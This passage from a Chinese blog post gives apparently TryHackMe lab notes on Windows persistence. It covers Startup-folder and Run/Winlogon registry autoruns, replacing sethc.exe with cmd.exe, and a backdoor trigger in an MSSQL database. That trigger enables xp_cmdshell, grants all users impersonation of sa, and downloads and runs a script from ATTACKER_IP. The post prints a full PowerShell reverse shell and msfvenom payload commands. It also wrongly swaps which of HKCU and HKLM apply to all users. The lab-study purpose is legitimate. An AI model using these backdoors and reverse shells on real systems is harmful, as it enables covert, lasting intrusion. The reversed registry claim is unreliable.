<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy revshell.exe &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\&quot;</span><br></pre></td></tr></table></figure>

<p>注意，文件记得把完整路径搞上，不然识别不到</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412261827960.png?raw=true" alt="image-20241226182737825"></p>
<p>然后注销我们的会话</p>
<p>重新登录RDP，攻击机监听4450，发现接收到shell</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412261829860.png?raw=true" alt="image-20241226182923722"></p>
<h4 id="Run-RunOnce"><a href="#Run-RunOnce" class="headerlink" title="Run &#x2F;RunOnce"></a>Run &#x2F;RunOnce</h4><p>我们还可以强制用户在登陆时通过注册表执行程序</p>
<p>可以使用以下注册表项指定登录时自启动的应用程序</p>
<ul>
<li><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
<li><code>HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></li>
<li><code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
<li><code>HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></li>
</ul>
<p>HKCU注册表项应用于所有人，而HKLM只适用于当前用户</p>
<p>开始之前依旧是生成一个exe</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.84.168 LPORT=4451 -f exe -o revshell.exe</span><br></pre></td></tr></table></figure>

<p>传输到目标主机上后，再将其移动到<code>C:\Windows\</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move C:\Users\Administrator\Desktop\revshell.exe C:\windows</span><br></pre></td></tr></table></figure>

<p>然后我们在</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>

<p>下创建一个注册表项，条目名称随便，值是我们要执行的命令</p>
<p>这里要执行我们的revshell.exe，所以直接写对应路径<code>C:\windows\revshell.exe</code></p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412270911705.png?raw=true" alt="image-20241227091147527"></p>
<p>完成操作后，注销再登录就能收到shell了</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412270913736.png?raw=true" alt="image-20241227091348561"></p>
<h4 id="Winlogon"><a href="#Winlogon" class="headerlink" title="Winlogon"></a>Winlogon</h4><p>登录自启动程序的另一个替代就是滥用Winlogon</p>
<p>Winlogon是windows组件，可以在身份验证后立即加载您的用户配置文件</p>
<p><code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code></p>
<p>这是Winlogon的注册表路径</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412281826290.png?raw=true" alt="image-20241228182621112"></p>
<ul>
<li><code>Userinit</code>指向 ，它负责恢复您的用户配置文件首选项。<code>userinit.exe</code></li>
<li><code>shell</code>指向系统的 shell，通常为 .<code>explorer.exe</code></li>
</ul>
<p>我们可以用反弹shell文件替换这些可执行文件，不过，我们还可以用逗号分隔，使得Winlogon连同我们的反弹shell文件一起处理</p>
<p>像这样</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412281850149.png?raw=true" alt="image-20241228185031031"></p>
<p>然后注销重新登录，就能收到shell了</p>
<h4 id="登录脚本"><a href="#登录脚本" class="headerlink" title="登录脚本"></a>登录脚本</h4><p>加载用户配置文件时，有一项操作是检查一项叫做<strong>UserInitMprLogonScript</strong>的环境变量</p>
<p>我们可以利用这个环境变量为用户指定一个登录脚本，用户在登录计算机时，该脚本会运行</p>
<p>此变量默认是未设置的，因此我们可以直接创建它，并用它指定我们想要的脚本</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412281857189.png?raw=true" alt="image-20241228185705053"></p>
<h4 id="对登录屏幕-RDP进行后门植入"><a href="#对登录屏幕-RDP进行后门植入" class="headerlink" title="对登录屏幕&#x2F;RDP进行后门植入"></a>对登录屏幕&#x2F;RDP进行后门植入</h4><p>这部分就粘滞键是新东西，需要注意的一点是，之前提权的一部分内容还是能拿来做权限维持的，比如这一个任务7中的Ultiman，在前面我们通过这玩意篡改Ease of Access，同样的也能拿来触发后门提权</p>
<p>出于学习效率考虑，这里就不多赘述</p>
<h4 id="粘滞键"><a href="#粘滞键" class="headerlink" title="粘滞键"></a>粘滞键</h4><p>当按下诸如 “Ctrl + Alt + Del” 这样的组合键时，你可以在 Windows 系统中设置启用粘滞键功能。</p>
<p>启用粘滞键后，你可以按顺序逐个按下组合键中的按键，而无需同时按下。</p>
<p>也就是说，如果你启用了粘滞键，你就可以先按Ctrl，再依次Alt、Del，就能达到同时按下 “Ctrl + Alt + Del” 组合键相同的效果</p>
<p>打游戏的哥们会经常碰到这个东西</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412281906740.png?raw=true" alt="image-20241228190633611"></p>
<p>Windows的默认快捷方式，按五次SHIFT会弹出这个窗口</p>
<p>其实Windows是激活了 <strong><code>C:\Windows\System32\sethc.exe</code></strong> 路径下的二进制文件，如果我们能将这个二进制文件替换成我们的payload，就能实现提权（因为Windows在锁屏时依然能通过五次SHIFT触发这个文件）</p>
<p>不过，想要修改这个文件，我们首先需要获得文件的所有权，并授予当前用户修改它的权限</p>
<p>我们可以用命令做到这点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">takeown /f c:\Windows\System32\sethc.exe #获得文件所有权</span><br><span class="line">icacls C:\Windows\System32\sethc.exe /grant Administrator:F #赋予修改权限</span><br><span class="line">copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe #将cmd.exe替换sethc.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412281913670.png?raw=true" alt="image-20241228191325531"></p>
<p>接下来锁定屏幕，尝试调出CMD</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412281916554.png?raw=true" alt="image-20241228191615428"></p>
<p>得手了！</p>
<h3 id="通过现有服务维持权限"><a href="#通过现有服务维持权限" class="headerlink" title="通过现有服务维持权限"></a>通过现有服务维持权限</h3><p>之前的这些操作的前提都是：我们已经可以在目标windows主机上为所欲为了</p>
<p>但有的时候我们没办法直接操纵目标的主机，不过我们能操纵服务，比如web服务、数据库服务</p>
<p>这个时候我们就可以从这些服务入手</p>
<p>由于webshell这个是老生常谈了，这里不过多赘述，主要讲一个数据库的东西</p>
<h4 id="使用MSSQL作为后门"><a href="#使用MSSQL作为后门" class="headerlink" title="使用MSSQL作为后门"></a>使用MSSQL作为后门</h4><p>MSSQL有一个东西叫做<strong>触发器（Trigger）</strong>，触发器可以绑定在数据库中发生特定事件时，需要执行的操作</p>
<p>这些事件可以是增删查改，应用范围很广</p>
<p>在这个任务点当中，我们要对数据库HRDB当中的任何<strong>插入操作</strong>创建一个触发器</p>
<p>在开始之前，我们需要启用存储过程<strong>xp_cmdshell</strong></p>
<p>这是MSSQL安装中默认提供的一个过程，允许我们直接在系统控制台中执行命令，但是默认是禁用的</p>
<p>首先用管理员身份打开</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412281932329.png?raw=true" alt="image-20241228193242194"></p>
<p>然后打开查询编辑器</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412281933176.png?raw=true" alt="image-20241228193313052"></p>
<p>接着输入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#x27;Show Advanced Options&#x27;,1; #在数据库中启用高级选项</span><br><span class="line">RECONFIGURE;                            #更新设置后的配置</span><br><span class="line">GO                                      #把前面的SQL语句作为一个批次发送到SQL Server执行</span><br><span class="line"></span><br><span class="line">sp_configure &#x27;xp_cmdshell&#x27;,1;			#启用xp_cmdshell</span><br><span class="line">RECONFIGURE;						</span><br><span class="line">GO					</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412281940649.png?raw=true" alt="image-20241228194016530"></p>
<p>在此之后，我们必须确保任何访问该数据库的网站都能运行<code>xp_cmdshell</code>。</p>
<p>默认情况下，只有具有<code>sysadmin</code>角色的数据库用户才能这样做。</p>
<p>鉴于预计 Web 应用程序会使用受限的数据库用户，我们可以授予所有用户模拟<code>sa</code>用户（默认数据库管理员）的权限。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">USE master</span><br><span class="line"></span><br><span class="line">GRANT IMPERSONATE ON LOGIN::sa to [Public];</span><br><span class="line"></span><br><span class="line">USE HRDB</span><br><span class="line"></span><br><span class="line">CREATE TRIGGER [sql_backdoor]</span><br><span class="line">ON HRDB.dbo.Employees </span><br><span class="line">FOR INSERT AS</span><br><span class="line"></span><br><span class="line">EXECUTE AS LOGIN = &#x27;sa&#x27;</span><br><span class="line">EXEC master..xp_cmdshell &#x27;Powershell -c &quot;IEX(New-Object net.webclient).downloadstring(&#x27;&#x27;http://ATTACKER_IP:8000/evilscript.ps1&#x27;&#x27;)&quot;&#x27;;</span><br></pre></td></tr></table></figure>

<p>然后在攻击机上创建</p>
<p>evilscript.psl，Powershell脚本</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;ATTACKER_IP&quot;</span>,<span class="number">4454</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();</span><br><span class="line">[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);</span><br><span class="line">    <span class="variable">$sendback</span> = (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> );</span><br><span class="line">    <span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">&quot;PS &quot;</span> + (<span class="built_in">pwd</span>).Path + <span class="string">&quot;&gt; &quot;</span>;</span><br><span class="line">    <span class="variable">$sendbyte</span> = ([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>);</span><br><span class="line">    <span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);</span><br><span class="line">    <span class="variable">$stream</span>.Flush()</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure>

<p>这样我们向数据库发送INSERT语句触发Trigger的时候，就会远程下载powershell脚本，实现权限维持了</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">deCOLE</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/03/18/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">http://example.com/2025/03/18/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">deCOLE's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/TryHackMe/">TryHackMe</a></div><div class="post-share"><div class="social-share" data-image="/img/bnb.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/03/18/Windows%E5%86%85%E9%83%A8/" title="Windows内部"><img class="cover" src="/img/bnb.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Windows内部</div></div><div class="info-2"><div class="info-item-1">Windows内部进程（Processes）每个进程都提供执行程序所需要的资源 进程具有虚拟空间、可执行代码、系统对象的开放句柄、安全上下文、唯一进程标识符、环境变量、优先级类、最小和最大工作及大小、至少一个执行线程 每个进程都用单个线程（通常称为主线程）启动，但可以从其任何线程创建其他线程    进程组件 作用    私有虚拟地址空间 为进程分配虚拟内存地址   可执行程序 定义存储在虚拟地址空间中的代码和数据   开放句柄 定义进程可以访问的系统资源的句柄   安全上下文 访问令牌，定义用户、权限和其他安全信息   进程ID 进程的唯一数字标识符   线程 计划执行的进程部分   从更底层的层面来看，也就是从虚拟地址空间一层面来解释进程 进程在内存中的组件和用途大概如下    组件 用途    代码(Code) 提供进程执行的代码   全局变量(Global Variables) 存储的变量   进程堆（Process Heap） 定义数据存储的堆   进程资源(Process Resources) 定义进程的更多资源   环境块（Environment...</div></div></div></a><a class="pagination-related" href="/2025/03/18/Windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" title="Windows权限提升"><img class="cover" src="/img/bnb.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Windows权限提升</div></div><div class="info-2"><div class="info-item-1">Windows权限提升常见获取密码方式无人值守的 Windows 安装在大量主机上安装 Windows 时，管理员可以使用 Windows 部署服务，该服务允许通过网络将单个操作系统映像部署到多个主机。这些类型的安装称为无人值守安装，因为它们不需要用户交互。此类安装需要使用管理员帐户执行初始设置，最终可能会存储在计算机的以下位置： 12345目录:\无人参与.xmlC:\Windows\Panther\Unattend.xmlC:\Windows\Panther\Unattend\Unattend.xml系统信息文件夹:\Windows\system32\sysprep.infC:\Windows\system32\sysprep\sysprep.xml  作为这些文件的一部分，您可能会遇到凭证： 12345&lt;Credentials&gt;    &lt;Username&gt;Administrator&lt;/Username&gt;    &lt;Domain&gt;thm.local&lt;/Domain&gt;   ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/03/18/Windows%E5%86%85%E9%83%A8/" title="Windows内部"><img class="cover" src="/img/bnb.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-18</div><div class="info-item-2">Windows内部</div></div><div class="info-2"><div class="info-item-1">Windows内部进程（Processes）每个进程都提供执行程序所需要的资源 进程具有虚拟空间、可执行代码、系统对象的开放句柄、安全上下文、唯一进程标识符、环境变量、优先级类、最小和最大工作及大小、至少一个执行线程 每个进程都用单个线程（通常称为主线程）启动，但可以从其任何线程创建其他线程    进程组件 作用    私有虚拟地址空间 为进程分配虚拟内存地址   可执行程序 定义存储在虚拟地址空间中的代码和数据   开放句柄 定义进程可以访问的系统资源的句柄   安全上下文 访问令牌，定义用户、权限和其他安全信息   进程ID 进程的唯一数字标识符   线程 计划执行的进程部分   从更底层的层面来看，也就是从虚拟地址空间一层面来解释进程 进程在内存中的组件和用途大概如下    组件 用途    代码(Code) 提供进程执行的代码   全局变量(Global Variables) 存储的变量   进程堆（Process Heap） 定义数据存储的堆   进程资源(Process Resources) 定义进程的更多资源   环境块（Environment...</div></div></div></a><a class="pagination-related" href="/2025/03/18/Windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" title="Windows权限提升"><img class="cover" src="/img/bnb.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-18</div><div class="info-item-2">Windows权限提升</div></div><div class="info-2"><div class="info-item-1">Windows权限提升常见获取密码方式无人值守的 Windows 安装在大量主机上安装 Windows 时，管理员可以使用 Windows 部署服务，该服务允许通过网络将单个操作系统映像部署到多个主机。这些类型的安装称为无人值守安装，因为它们不需要用户交互。此类安装需要使用管理员帐户执行初始设置，最终可能会存储在计算机的以下位置： 12345目录:\无人参与.xmlC:\Windows\Panther\Unattend.xmlC:\Windows\Panther\Unattend\Unattend.xml系统信息文件夹:\Windows\system32\sysprep.infC:\Windows\system32\sysprep\sysprep.xml  作为这些文件的一部分，您可能会遇到凭证： 12345&lt;Credentials&gt;    &lt;Username&gt;Administrator&lt;/Username&gt;    &lt;Domain&gt;thm.local&lt;/Domain&gt;   ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">deCOLE</div><div class="author-info-description">凡夫俗子岂识我，非到末路不甘休</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">1.</span> <span class="toc-text">Windows权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%A1%E6%94%B9%E9%9D%9E%E7%89%B9%E6%9D%83%E8%B4%A6%E6%88%B7"><span class="toc-number">1.1.</span> <span class="toc-text">篡改非特权账户</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E9%85%8D%E7%BB%84%E6%88%90%E5%91%98%E8%B5%84%E6%A0%BC"><span class="toc-number">1.1.1.</span> <span class="toc-text">分配组成员资格</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E6%9D%83%E9%99%90%E5%92%8C%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6"><span class="toc-number">1.1.2.</span> <span class="toc-text">特殊权限和安全描述符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RID%E5%8A%AB%E6%8C%81"><span class="toc-number">1.1.3.</span> <span class="toc-text">RID劫持</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.</span> <span class="toc-text">后门文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.3.</span> <span class="toc-text">滥用服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%90%8E%E9%97%A8%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.3.1.</span> <span class="toc-text">创建后门服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E7%8E%B0%E6%9C%89%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.3.2.</span> <span class="toc-text">修改现有服务</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.4.</span> <span class="toc-text">滥用计划任务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.4.1.</span> <span class="toc-text">计划任务程序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.4.2.</span> <span class="toc-text">隐藏计划任务</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E8%A7%A6%E5%8F%91%E7%BB%B4%E6%9D%83"><span class="toc-number">1.5.</span> <span class="toc-text">登录触发维权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="toc-number">1.5.1.</span> <span class="toc-text">启动文件夹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Run-RunOnce"><span class="toc-number">1.5.2.</span> <span class="toc-text">Run &#x2F;RunOnce</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Winlogon"><span class="toc-number">1.5.3.</span> <span class="toc-text">Winlogon</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC"><span class="toc-number">1.5.4.</span> <span class="toc-text">登录脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E7%99%BB%E5%BD%95%E5%B1%8F%E5%B9%95-RDP%E8%BF%9B%E8%A1%8C%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5"><span class="toc-number">1.5.5.</span> <span class="toc-text">对登录屏幕&#x2F;RDP进行后门植入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B2%98%E6%BB%9E%E9%94%AE"><span class="toc-number">1.5.6.</span> <span class="toc-text">粘滞键</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%8E%B0%E6%9C%89%E6%9C%8D%E5%8A%A1%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90"><span class="toc-number">1.6.</span> <span class="toc-text">通过现有服务维持权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8MSSQL%E4%BD%9C%E4%B8%BA%E5%90%8E%E9%97%A8"><span class="toc-number">1.6.1.</span> <span class="toc-text">使用MSSQL作为后门</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/03/18/Pearcmd%E6%80%BB%E7%BB%93%E5%8F%8A%E5%88%A9%E7%94%A8/" title="Pearcmd总结及利用"><img src="/img/bnb.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pearcmd总结及利用"/></a><div class="content"><a class="title" href="/2025/03/18/Pearcmd%E6%80%BB%E7%BB%93%E5%8F%8A%E5%88%A9%E7%94%A8/" title="Pearcmd总结及利用">Pearcmd总结及利用</a><time datetime="2025-03-17T16:00:00.000Z" title="发表于 2025-03-18 00:00:00">2025-03-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/18/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="Python原型链污染"><img src="/img/bnb.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Python原型链污染"/></a><div class="content"><a class="title" href="/2025/03/18/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="Python原型链污染">Python原型链污染</a><time datetime="2025-03-17T16:00:00.000Z" title="发表于 2025-03-18 00:00:00">2025-03-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/18/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" title="Python沙箱逃逸"><img src="/img/bnb.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Python沙箱逃逸"/></a><div class="content"><a class="title" href="/2025/03/18/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" title="Python沙箱逃逸">Python沙箱逃逸</a><time datetime="2025-03-17T16:00:00.000Z" title="发表于 2025-03-18 00:00:00">2025-03-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/18/Python%E9%BB%91%E5%B8%BD%E5%AD%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/" title="Python黑帽子阅读笔记"><img src="/img/bnb.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Python黑帽子阅读笔记"/></a><div class="content"><a class="title" href="/2025/03/18/Python%E9%BB%91%E5%B8%BD%E5%AD%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/" title="Python黑帽子阅读笔记">Python黑帽子阅读笔记</a><time datetime="2025-03-17T16:00:00.000Z" title="发表于 2025-03-18 00:00:00">2025-03-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" title="Redis未授权访问"><img src="/img/bnb.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Redis未授权访问"/></a><div class="content"><a class="title" href="/2025/03/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" title="Redis未授权访问">Redis未授权访问</a><time datetime="2025-03-17T16:00:00.000Z" title="发表于 2025-03-18 00:00:00">2025-03-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By deCOLE</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>